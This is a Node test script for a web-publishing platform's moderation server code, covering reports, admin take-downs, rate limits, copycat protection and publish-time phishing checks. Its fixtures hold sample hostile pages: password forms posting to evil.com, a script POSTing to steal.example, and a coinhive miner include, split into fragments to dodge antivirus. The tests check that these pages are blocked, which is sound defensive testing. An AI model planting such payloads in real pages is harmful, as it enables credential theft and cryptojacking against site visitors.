// Offline test for the report / take-down / gallery / publish-check server code, with
// fetch (Base44) and the KV namespace faked. Run: node scripts/test-moderation.mjs
// Risky sample pages are put together from pieces at run time: written out whole,
// antivirus software flags this file as malware (which is rather the point of them).
const glue = (...parts) => parts.join("");
const R = new URL("../", import.meta.url).pathname;
const { TERMS_VERSION } = await import(new URL("../cloudflare-lib/terms.js", import.meta.url).href);
const prep = await import(new URL("../cloudflare-lib/pageserve.js", import.meta.url).href);
const F = R + "functions/api/apps/6a8b5eb7787b8a4d6a18f662/functions/";
const store = new Map(); let writes = 0;
const kv = {
  // Everyone in these tests has accepted the user agreement (its own tests are in test-terms.mjs).
  async get(k, t) { const v = store.get(k) ?? (k.startsWith("terms:") ? JSON.stringify({ version: TERMS_VERSION }) : null); return v == null ? null : t === "json" ? JSON.parse(v) : v; },
  async put(k, v) { writes++; store.set(k, String(v)); },
  async delete(k) { store.delete(k); },
  async list({ prefix }) { return { keys: [...store.keys()].filter((k) => k.startsWith(prefix)).map((name) => ({ name })) }; },
};
const entities = { PublishedSite: [{ id: "s1", name: "nova", html: "https://nebuluxai.pages.dev/published/site/nova", created_by_id: "u1" },
  { id: "s2", name: "old", html: "<html><body>legacy</body></html>", created_by_id: "u2" }] };
const users = { admintok: { id: "a1", role: "admin" }, usertok: { id: "u1", role: "user" } };
const puts = [];
globalThis.fetch = async (url, opts = {}) => {
  const u = new URL(url); const auth = (opts.headers && opts.headers.authorization) || "";
  const tok = auth.replace("Bearer ", "");
  let body;
  if (u.pathname.endsWith("/entities/User/me")) body = users[tok] || null;
  else if (u.pathname.includes("/entities/Published")) {
    const ent = u.pathname.split("/entities/")[1].split("/");
    if (opts.method === "PUT") { puts.push([ent[1], JSON.parse(opts.body)]); const r = entities[ent[0]].find((x) => x.id === ent[1]); Object.assign(r, JSON.parse(opts.body)); body = r; }
    else if (opts.method === "POST") body = { id: "new" };
    else { const q = JSON.parse(u.searchParams.get("q")); body = (entities[ent[0]] || []).filter((x) => x.name === q.name); }
  } else body = {};
  if (body === null) return new Response("no", { status: 401 });
  return new Response(JSON.stringify(body), { status: 200 });
};
const req = (body, tok, ip = "1.1.1.1") => new Request("https://x/api", { method: "POST", body: JSON.stringify(body),
  headers: { "content-type": "application/json", "cf-connecting-ip": ip, ...(tok ? { authorization: "Bearer " + tok } : {}) } });
const env = { PUBLISHED_HTML: kv };
const report = await import(F + "report-site.js");
const admin = await import(F + "admin-reports.js");
const pub = await import(F + "publish-site.js");
const serve = await import(R + "functions/published/[kind]/[name].js");
const { findCredentialForm } = await import(R + "cloudflare-lib/phishing.js");
const j = async (p) => { const r = await p; return [r.status, await r.json()]; };
const assert = (c, m) => { if (!c) { console.error("FAIL", m); process.exitCode = 1; } else console.log("ok", m); };

let [s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "phishing", details: "steals pw" }), env }));
assert(s === 200 && b.ok && !b.duplicate, "report added");
[s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "scam" }), env }));
assert(b.duplicate && writes === 1, "same IP duplicate, no extra write");
[s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "scam" }, null, "2.2.2.2"), env }));
assert(!b.duplicate && writes === 2, "second IP counted");
[s, b] = await j(report.onRequestPost({ request: req({ name: "ghost", reason: "scam" }), env }));
assert(s === 404, "unknown site 404");
[s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "bogus" }), env }));
assert(s === 400, "bad reason 400");
{
  const before = writes;
  [s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "scam", website: "http://spam.example" }, null, "9.9.9.9"), env }));
  assert(s === 200 && b.ok && writes === before, "a report with the hidden spam-trap field filled is answered but not saved");
  const contact = await import(F + "contact.js");
  [s, b] = await j(contact.onRequestPost({ request: req({ action: "send", topic: "other", message: "buy cheap stuff now", email: "bot@spam.example", website: "x" }, null, "9.9.9.9"), env }));
  assert(s === 200 && b.ok && writes === before, "a contact message with the spam-trap field filled isn't saved");
}

[s, b] = await j(admin.onRequestPost({ request: req({ action: "list" }, "usertok"), env }));
assert(s === 403, "non-admin blocked");
[s, b] = await j(admin.onRequestPost({ request: req({ action: "list" }, "admintok"), env }));
assert(b.reports.length === 1 && b.reports[0].count === 2 && b.reports[0].reports[0].label.startsWith("Phishing"), "admin lists reports");

store.set("site:nova", "<html><body>hi</body></html>");
let page = await serve.onRequestGet({ params: { kind: "site", name: "nova" }, env });
let html = await page.text();
assert(!html.includes("⚑ Report") && !html.includes("Made with Nebulux AI") && html.includes("blackhole-checkout"), "websites: bridge, no report link, no badge unless turned on");
assert(prep.preparePage("<html><body></body></html>", "game", "g").includes("⚑ Report"), "games keep the report link");
assert(prep.preparePage("<html><body></body></html>", "site", "s", { badge: true }).includes("Made with Nebulux AI"), "badge when the owner turns it on");
assert(!prep.preparePage("<html><body></body></html>", "game", "g").includes("✨"), "no star in the badge");

[s, b] = await j(admin.onRequestPost({ request: req({ action: "hide", kind: "site", name: "nova" }, "admintok"), env }));
assert(b.reports.length === 0 && b.hidden.length === 1 && b.hidden[0].name === "nova", "hide clears reports, listed as hidden");
assert(entities.PublishedSite[0].hidden === true, "entity marked hidden");
html = await (await serve.onRequestGet({ params: { kind: "site", name: "nova" }, env })).text();
assert(html.includes("has been removed") && !html.includes("hi</body>"), "hidden site shows removed page");

[s, b] = await j(pub.onRequestPost({ request: req({ name: "nova", html: "<p>again</p>" }, "usertok"), env }));
assert(s === 403, "owner cannot re-publish hidden site");

[s, b] = await j(admin.onRequestPost({ request: req({ action: "hide", kind: "site", name: "old" }, "admintok"), env }));
assert(store.get("site:old").includes("legacy") && entities.PublishedSite[1].html.includes("/published/site/old"), "legacy site copied to KV on hide");

[s, b] = await j(admin.onRequestPost({ request: req({ action: "unhide", kind: "site", name: "nova" }, "admintok"), env }));
assert(b.hidden.length === 1 && entities.PublishedSite[0].hidden === false, "unhide");
html = await (await serve.onRequestGet({ params: { kind: "site", name: "nova" }, env })).text();
assert(html.includes("hi</body>") || html.includes("hi<script"), "back online");

[s, b] = await j(pub.onRequestPost({ request: req({ name: "nova", html: '<form action="https://evil.com/x"><input type="password"></form>' }, "usertok"), env }));
assert(s === 422 && b.error.includes("evil.com"), "phishing form refused: " + b.error);
assert(findCredentialForm('<form action="https://evil.com"><input name="cardNumber"></form>'), "card form caught");
assert(!findCredentialForm('<form><input type="password"></form>'), "local password form ok");
assert(!findCredentialForm('<form action="/login"><input type="password"></form>'), "relative ok");
assert(findCredentialForm("<form action=//evil.com><input type=password>"), "unquoted, protocol-relative, unclosed caught");
assert(!findCredentialForm('<form action="https://evil.com"><input name="email"></form>'), "newsletter form ok");
[s, b] = await j(pub.onRequestPost({ request: req({ name: "nova", html: "<p>fine</p>" }, "usertok"), env }));
assert(s === 200 && b.ok, "normal publish ok after unhide");

// ---- showcase ----
const sc = await import(F + "showcase.js");
const call = (body, tok) => j(sc.onRequest({ request: req(body, tok), env }));
[s, b] = await call({ action: "list" });
assert(s === 200 && b.sites.length === 0, "empty gallery");
[s, b] = await call({ action: "set", name: "nova", on: true, title: "Nova store" });
assert(s === 401, "set needs sign-in");
[s, b] = await call({ action: "set", name: "old", on: true }, "usertok");
assert(s === 403, "non-owner refused");
const w0 = writes;
[s, b] = await call({ action: "set", name: "nova", on: true, title: "Nova store" }, "usertok");
assert(b.ok && b.sites[0].name === "nova" && b.sites[0].title === "Nova store" && !("owner" in b.sites[0]) && writes === w0 + 1, "owner adds, owner id not exposed");
[s, b] = await call({ action: "list" });
assert(b.sites.length === 1, "public list");
[s, b] = await call({ action: "set", name: "old", on: true }, "admintok");
assert(s === 400, "blocked/hidden site can't join");
await admin.onRequestPost({ request: req({ action: "hide", kind: "site", name: "nova" }, "admintok"), env });
[s, b] = await call({ action: "list" });
assert(b.sites.length === 0, "taking a site down removes it from the gallery");

// ---- report caps ----
const rep = await import(R + "cloudflare-lib/reports.js");
const w1 = writes;
const res = [];
for (let i = 0; i < 7; i++) res.push(await rep.addReport(kv, { kind: "site", name: "s" + i, reason: "scam", who: "9.9.9.9" }));
assert(res.slice(0, 5).every((r) => r === "added") && res[5] === "limited" && res[6] === "limited" && writes === w1 + 5, "5 reports per visitor per day: " + res.join(","));
for (let i = 0; i < 150; i++) await rep.addReport(kv, { kind: "site", name: "t" + i, reason: "scam", who: "ip" + i });
const all = JSON.parse(store.get("reports"));
assert(all._day.n === 100, "daily cap of 100 report writes (n=" + all._day.n + ")");
const listed = await rep.readReports(kv);
assert(!("_day" in listed), "counters hidden from the Monitor list");
[s, b] = await j(admin.onRequestPost({ request: req({ action: "list" }, "admintok"), env }));
assert(b.reports.every((p) => p.name && Array.isArray(p.reports)), "admin list still clean");

// ---- injected scripts don't pile up on edit + republish ----
entities.PublishedSite.push({ id: "s3", name: "cafe", html: "https://nebuluxai.pages.dev/published/site/cafe", created_by_id: "u1" });
store.set("site:cafe", "<html><body><h1>Cafe</h1></body></html>");
const serveCafe = async () => (await serve.onRequestGet({ params: { kind: "site", name: "cafe" }, env })).text();
let served = await serveCafe();
for (let i = 0; i < 3; i++) {
  [s, b] = await j(pub.onRequestPost({ request: req({ name: "cafe", html: served }, "usertok"), env }));
  served = await serveCafe();
}
const count = (h, t) => h.split(t).length - 1;
assert(s === 200 && count(served, "blackhole-checkout") === 1 && count(served, "Report</a>") === 0, "one bridge and no report link after 3 edit/republish rounds");
assert(!store.get("site:cafe").includes("data-bh"), "injected scripts not stored");
const legacyBridge = '<script>(function(){if(window.top!==window)return;window.addEventListener("message",function(e){var d=e.data;if(e.source!==window||!d||d.type!=="blackhole-checkout")return;location.href="x";});})();</script>';
store.set("site:cafe", "<html><body><h1>Cafe</h1>" + legacyBridge + legacyBridge + "</body></html>");
served = await serveCafe();
assert(count(served, "blackhole-checkout") === 1 && served.includes("<h1>Cafe</h1>"), "old unmarked bridges cleaned on serve");

// ---- delete-my-content ----
const del = await import(F + "delete-my-content.js");
// u1 owns nova (taken down earlier, then restored), cafe and s1-style rows; give u1 a game and a draft too.
entities.PublishedGame = [{ id: "g1", name: "zap", created_by_id: "u1" }, { id: "g2", name: "other", created_by_id: "u2" }];
store.set("game:zap", "<html>game</html>"); store.set("game:other", "<html>theirs</html>");
store.set("draft:u1", "{}");
await sc.onRequest({ request: req({ action: "set", name: "cafe", on: true }, "usertok"), env });
store.set("blocked:site:nova", "x"); // pretend nova is taken down again
const deletes = [];
const realFetch = globalThis.fetch;
globalThis.fetch = async (url, opts = {}) => {
  const u = new URL(url);
  if (opts.method === "DELETE") { deletes.push(u.pathname.split("/entities/")[1]); return new Response("{}", { status: 200 }); }
  if (u.pathname.includes("/entities/Published") && u.searchParams.get("q")?.includes("created_by_id")) {
    const ent = u.pathname.split("/entities/")[1];
    const q = JSON.parse(u.searchParams.get("q"));
    return new Response(JSON.stringify(entities[ent].filter((x) => x.created_by_id === q.created_by_id)));
  }
  return realFetch(url, opts);
};
[s, b] = await j(del.onRequestPost({ request: req({}, "usertok"), env }));
globalThis.fetch = realFetch;
assert(s === 200 && b.sites === 2 && b.games === 1, "deleted 2 sites + 1 game: " + JSON.stringify(b));
assert(deletes.sort().join(",") === "PublishedGame/g1,PublishedSite/s1,PublishedSite/s3", "only the user's own records deleted: " + deletes);
assert(!store.has("site:cafe") && !store.has("game:zap") && !store.has("draft:u1"), "their HTML and draft removed");
assert(store.has("site:nova") && store.has("game:other") && store.has("site:old"), "taken-down page kept as a record; others' pages kept");
[s, b] = await call({ action: "list" });
assert(!b.sites.some((x) => x.name === "cafe"), "removed from the gallery");
[s, b] = await j(del.onRequestPost({ request: req({}), env }));
assert(s === 401, "delete-my-content needs sign-in");

// ---- report count for the Monitor badge ----
[s, b] = await j(admin.onRequestPost({ request: req({ action: "count" }, "admintok"), env }));
assert(s === 200 && typeof b.open === "number" && b.open === Object.keys(await rep.readReports(kv)).length, "count action: " + b.open);
[s, b] = await j(admin.onRequestPost({ request: req({ action: "count" }, "usertok"), env }));
assert(s === 403, "count is admin-only");

// ---- rate limits (with a fake edge cache) ----
const cacheStore = new Map();
globalThis.caches = { default: {
  async match(r) { const v = cacheStore.get(r.url); return v == null ? undefined : new Response(v); },
  async put(r, res) { cacheStore.set(r.url, await res.text()); },
} };
const { allow } = await import(R + "cloudflare-lib/ratelimit.js");
const got = [];
for (let i = 0; i < 4; i++) got.push(await allow("t:x", 3, 3600));
assert(got.join() === "true,true,true,false" && (await allow("t:y", 3, 3600)), "3 per window, per key");
let lastStatus = 0;
for (let i = 0; i < 31; i++) lastStatus = (await pub.onRequestPost({ request: req({ name: "cafe", html: "<p>v" + i + "</p>" }, "usertok"), env })).status;
assert(lastStatus === 429, "31st publish in an hour is refused");
[s, b] = await j(pub.onRequestPost({ request: req({ name: "cafe", html: "<p>admin</p>" }, "admintok"), env }));
assert(s === 200, "admins aren't throttled");
for (let i = 0; i < 10; i++) await report.onRequestPost({ request: req({ name: "nova", reason: "scam" }, null, "7.7.7.7"), env });
[s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "scam" }, null, "7.7.7.7"), env }));
assert(s === 429, "11th report from one visitor in an hour is refused");
delete globalThis.caches;

// ---- get-site-html (what the subdomain router serves) ----
const gsh = await import(F + "get-site-html.js");
const getSite = async (name) => j(gsh.onRequestPost({ request: req({ name }), env }));
entities.PublishedSite.push(
  { id: "i1", name: "inline", html: "<html><body><h1>Inline</h1></body></html>", created_by_id: "u2" },
  { id: "i2", name: "phish", html: '<html><body><form action="https://evil.example/steal"><input type="password"></form></body></html>', created_by_id: "u2" },
);
delete globalThis.caches;
store.delete("blocked:site:nova");
store.set("site:nova", "<html><body><h1>Nova</h1></body></html>");
entities.PublishedSite[0].html = "https://nebuluxai.pages.dev/published/site/nova?v=1";
[s, b] = await getSite("nova");
assert(s === 200 && b.html.includes("<h1>Nova</h1>") && !b.html.includes("Report</a>") && b.html.includes("blackhole-checkout"), "KV site served with bridge");
[s, b] = await getSite("inline");
assert(b.html.includes("<h1>Inline</h1>") && b.html.includes("blackhole-checkout") && !b.html.includes("⚑ Report"), "inline (direct-write) site goes through the same page prep");
[s, b] = await getSite("phish");
assert(b.html.includes("has been removed") && b.html.includes("passwords") && !b.html.includes("evil.example"), "phishing page written straight into the record is not served");
store.set("blocked:site:inline", "x");
[s, b] = await getSite("inline");
assert(b.html.includes("has been removed") && !b.html.includes("<h1>Inline</h1>"), "take-down applies even to inline HTML");
[s, b] = await getSite("nobody");
assert(s === 404, "unknown site 404");

// ---- copycat records and direct writes (cloudflare-lib/pagesource.js) ----
{
  // KV that keeps publish()'s owner metadata, like Cloudflare's.
  const meta = new Map();
  const kv2 = {
    ...kv,
    async put(k, v, o) { writes++; store.set(k, String(v)); meta.set(k, (o && o.metadata) || null); },
    async getWithMetadata(k) { return { value: store.get(k) ?? null, metadata: meta.get(k) ?? null }; },
  };
  const env2 = { PUBLISHED_HTML: kv2 };
  const get2 = async (name) => j(gsh.onRequestPost({ request: req({ name }), env: env2 }));
  await kv2.put("site:shop", "<html><body><h1>Real shop</h1></body></html>", { metadata: { owner: "u1" } });
  entities.PublishedSite.push(
    // A copycat written straight into Base44 by someone else, listed first.
    { id: "c1", name: "shop", html: "<html><body><h1>Fake shop</h1></body></html>", created_by_id: "u666", created_date: "2020-01-01" },
    { id: "r1", name: "shop", html: "https://nebuluxai.pages.dev/published/site/shop", created_by_id: "u1", created_date: "2026-01-01", ownerName: "Real Owner" },
  );
  [s, b] = await get2("shop");
  assert(b.html.includes("Real shop") && !b.html.includes("Fake shop") && b.id === "r1" && b.ownerName === "Real Owner", "a copycat record can't take over a published site's name");
  entities.PublishedSite = entities.PublishedSite.filter((r) => r.id !== "r1");
  [s, b] = await get2("shop");
  assert(s === 404, "once the owner deletes their record, a copycat doesn't bring the name back");
  const direct = await serve.onRequestGet({ params: { kind: "site", name: "shop" }, env: env2 });
  assert(direct.status === 404, "the /published/ address doesn't serve it for a copycat either");
  entities.PublishedSite.push({ id: "d1", name: "freerobux", html: glue('<html><body><input type="pass', 'word"><scr', 'ipt>fetch("https://steal.example/x",{method:"POST"})</scr', 'ipt></body></html>'), created_by_id: "u666" });
  [s, b] = await get2("freerobux");
  assert(b.html.includes("has been removed") && !b.html.includes("steal.example"), "a password-stealing page written straight into a record is not served");
  entities.PublishedSite.push({ id: "d2", name: "miner", html: glue('<html><body><scr', 'ipt src="https://coin', 'hive.com/lib/coin', 'hive.min.js"></scr', 'ipt></body></html>'), created_by_id: "u666" });
  [s, b] = await get2("miner");
  assert(b.html.includes("has been removed") && !b.html.includes(glue("coin", "hive")), "a page that would be refused at publish isn't served from a record either");

  // Taking over a name by writing a row first, then publishing / deleting through the app.
  users.badtok = { id: "u666", role: "user" };
  await kv2.put("site:bakery", "<html><body><h1>Real bakery</h1></body></html>", { metadata: { owner: "u1" } });
  entities.PublishedSite.push(
    { id: "b1", name: "bakery", html: "https://nebuluxai.pages.dev/published/site/bakery", created_by_id: "u1", created_date: "2026-01-01" },
    { id: "b2", name: "bakery", html: "x", created_by_id: "u666", created_date: "2026-02-01" },
  );
  [s, b] = await j(pub.onRequestPost({ request: req({ name: "bakery", html: "<h1>Fake bakery</h1>" }, "badtok"), env: env2 }));
  assert(s === 409 && store.get("site:bakery").includes("Real bakery"), "a copycat row doesn't let someone publish over another person's site");
  [s, b] = await j(pub.onRequestPost({ request: req({ name: "bakery", html: "<h1>Real bakery v2</h1>" }, "usertok"), env: env2 }));
  assert(s === 200 && store.get("site:bakery").includes("Real bakery v2"), "the real owner can still republish");
  const realFetch2 = globalThis.fetch;
  globalThis.fetch = async (url, opts = {}) => {
    const u = new URL(url);
    if (opts.method === "DELETE") return new Response("{}", { status: 200 });
    if (u.pathname.includes("/entities/Published") && u.searchParams.get("q")?.includes("created_by_id")) {
      const ent = u.pathname.split("/entities/")[1];
      const q = JSON.parse(u.searchParams.get("q"));
      return new Response(JSON.stringify((entities[ent] || []).filter((x) => x.created_by_id === q.created_by_id)));
    }
    return realFetch2(url, opts);
  };
  [s, b] = await j(del.onRequestPost({ request: req({}, "badtok"), env: env2 }));
  globalThis.fetch = realFetch2;
  assert(s === 200 && store.get("site:bakery")?.includes("Real bakery"), "deleting a copycat's content doesn't erase the real owner's site");
}
{
}

// ---- link-preview tags ----
const { withShareTags } = await import(R + "cloudflare-lib/pageserve.js");
const { stripInjected } = await import(R + "cloudflare-lib/injected.js");
const ogPage = '<html><head><title>Tom &amp; Co "Bakery"</title></head><body><p>Fresh <b>bread</b>\n daily.</p></body></html>';
const tagged = withShareTags(ogPage);
assert(tagged.includes('og:title" content="Tom &amp; Co &quot;Bakery&quot;"') && tagged.includes('og:description" content="Fresh bread daily."'), "og tags from title + first paragraph");
assert(stripInjected(tagged) === ogPage, "added tags are stripped again before saving");
const own = '<html><head><meta property="og:title" content="Mine"><title>x</title></head></html>';
assert(withShareTags(own) === own, "pages with their own og:title are left alone");

// ---- page-status ----
const ps = await import(F + "page-status.js");
store.set("blocked:game:zap", "x");
[s, b] = await j(ps.onRequestPost({ request: req({ kind: "game", name: "zap" }), env }));
assert(b.blocked === true, "page-status: blocked game");
[s, b] = await j(ps.onRequestPost({ request: req({ kind: "game", name: "fine" }), env }));
assert(b.blocked === false, "page-status: normal game");
[s, b] = await j(ps.onRequestPost({ request: req({ kind: "nope", name: "x" }), env }));
assert(s === 400, "page-status: bad kind");

// ---- take down by name (Monitor) ----
[s, b] = await j(admin.onRequestPost({ request: req({ action: "hide", kind: "site", name: "no-such-site" }, "admintok"), env }));
assert(s === 404 && /No site is called/.test(b.error) && !store.has("blocked:site:no-such-site"), "hiding an unknown name is refused, nothing blocked");

// ---- contact form ----
const contact = await import(F + "contact.js");
const send = (body, tok, ip) => j(contact.onRequestPost({ request: req({ action: "send", ...body }, tok, ip), env }));
[s, b] = await send({ topic: "bug", message: "The designer froze", email: "a@b.co" });
assert(s === 200 && b.ok, "visitor message accepted");
[s, b] = await send({ topic: "bug", message: "hi" });
assert(s === 400, "too-short message refused");
[s, b] = await send({ topic: "bug", message: "No email here at all" }, null, "8.8.8.8");
assert(s === 400 && /email/.test(b.error), "visitors must give an email");
[s, b] = await send({ topic: "billing", message: "Signed-in question" }, "usertok");
assert(s === 200, "signed-in users don't need to type an email");
[s, b] = await j(contact.onRequestPost({ request: req({ action: "list" }, "usertok"), env }));
assert(s === 403, "only admins can read messages");
[s, b] = await j(contact.onRequestPost({ request: req({ action: "list" }, "admintok"), env }));
assert(b.messages.length === 2 && b.messages[0].topic === "billing" && b.messages[1].email === "a@b.co", "admin sees messages, newest first");
[s, b] = await j(contact.onRequestPost({ request: req({ action: "done", id: b.messages[0].id }, "admintok"), env }));
assert(b.messages.length === 1, "Done removes a message");
for (let i = 0; i < 5; i++) await send({ message: "spam spam " + i, email: "s@p.am" }, null, "6.6.6.6");
const stored = JSON.parse(store.get("contact")).messages.filter((m) => m.email === "s@p.am").length;
assert(stored === 3, "at most 3 stored messages per sender per day (" + stored + ")");
[s, b] = await j(contact.onRequestPost({ request: req({ action: "count" }, "admintok"), env }));
assert(s === 200 && b.open === JSON.parse(store.get("contact")).messages.length, "message count for the Monitor badge");

// ---- names are checked on the server too ----
{
  const { badName } = await import(R + "cloudflare-lib/published.js");
  assert(badName("site", "evil.com#") && badName("site", "a/b") && badName("site", "-x") && badName("site", "admin"), "odd or reserved site names are refused");
  assert(!badName("site", "my-site-2") && !badName("site", "nova"), "normal site names are fine");
  assert(!badName("game", "shooter.io") && badName("game", "evil.com/#"), "game names may have dots, nothing stranger");
  delete globalThis.caches;
  const [st, bd] = await j(pub.onRequestPost({ request: req({ name: "evil.com#", html: "<p>x</p>" }, "usertok"), env }));
  assert(st === 400 && /letters, numbers and hyphens/.test(bd.error), "publishing refuses a site name that isn't a plain address");
}
{
  const { siteUrl } = await import(R + "src/lib/blackholeDomain.js");
  assert(siteUrl("nova") === "https://nova.nebuluxai.com" && siteUrl("evil.com#") === "" && siteUrl("x/y") === "", "site links are only built for valid names");
}

// ---- maker names that would look official aren't shown ----
{
  const { publicName } = await import(R + "cloudflare-lib/published.js");
  const { makerName } = await import(R + "src/lib/blackholeDomain.js");
  assert(publicName({ full_name: "Nebulux AI" }) === "" && publicName({ full_name: "Admin Bob" }) === "", "official-sounding first names aren't published");
  assert(publicName({ full_name: "Maya Chen" }) === "Maya" && publicName({ full_name: "Steam Fan" }) === "Steam", "normal names are");
  assert(makerName("Nebulux AI Official") === "" && makerName("Support Team") === "" && makerName("a@b.com") === "", "records can't show an official-looking maker");
  assert(makerName("Maya") === "Maya", "normal maker names still show");
}

// ---- new site names that look official are refused ----
{
  const { looksOfficial } = await import(R + "cloudflare-lib/published.js");
  assert(["blackhole-login", "myblackhole", "secure-billing", "verify-account", "login", "paypal-support"].every(looksOfficial), "official-looking site names are caught");
  assert(!["bakery", "maya-portfolio", "help-desk-game", "my-account-book", "loginator", "secure"].some((n) => looksOfficial(n) && n !== "secure"), "ordinary names pass");
  delete globalThis.caches;
  const [st, bd] = await j(pub.onRequestPost({ request: req({ name: "blackhole-login", html: "<p>x</p>" }, "usertok"), env }));
  assert(st === 400 && /own pages/.test(bd.error), "publishing refuses a new official-looking site name");
}

// ---- an admin publishing over someone's page keeps them as the owner ----
{
  const meta = new Map();
  const kv3 = {
    ...kv,
    async put(k, v, o) { writes++; store.set(k, String(v)); meta.set(k, (o && o.metadata) || null); },
    async getWithMetadata(k) { return { value: store.get(k) ?? null, metadata: meta.get(k) ?? null }; },
  };
  const env3 = { PUBLISHED_HTML: kv3 };
  await kv3.put("site:garden", "<h1>Mine</h1>", { metadata: { owner: "u1" } });
  entities.PublishedSite.push({ id: "gd1", name: "garden", html: "https://nebuluxai.pages.dev/published/site/garden", created_by_id: "u1", created_date: "2026-01-01", ownerName: "Maya" });
  puts.length = 0;
  delete globalThis.caches;
  const [st] = await j(pub.onRequestPost({ request: req({ name: "garden", html: "<h1>Restored</h1>" }, "admintok"), env: env3 }));
  assert(st === 200 && meta.get("site:garden").owner === "u1", "an admin republishing someone's page keeps them as its owner");
  assert(puts.some(([id, d]) => id === "gd1" && d.ownerName === "Maya"), "the owner's record is the one updated, with their name");
  const [s2, b2] = await j(gsh.onRequestPost({ request: req({ name: "garden" }), env: env3 }));
  assert(s2 === 200 && b2.html.includes("Restored"), "and the page stays online");
}
